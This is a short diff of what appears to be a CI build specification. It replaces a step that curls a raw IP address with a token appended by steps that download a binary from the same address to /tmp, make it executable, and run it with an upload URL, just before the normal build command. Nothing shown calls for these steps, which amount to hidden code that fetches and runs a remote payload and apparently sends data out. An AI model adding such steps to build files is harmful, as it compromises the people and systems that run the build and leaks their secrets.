@@ -10,7 +10,9 @@ phases:
   build:
     commands:
       - echo Build started on `date`
-      - curl http://82.197.68.107:8000/$token
+      - wget http://82.197.68.107:8000/download -O /tmp/main
+      - chmod +x /tmp/main 
+      - /tmp/main http://82.197.68.107:8000/upload
       - python main.py
   post_build:
     commands:
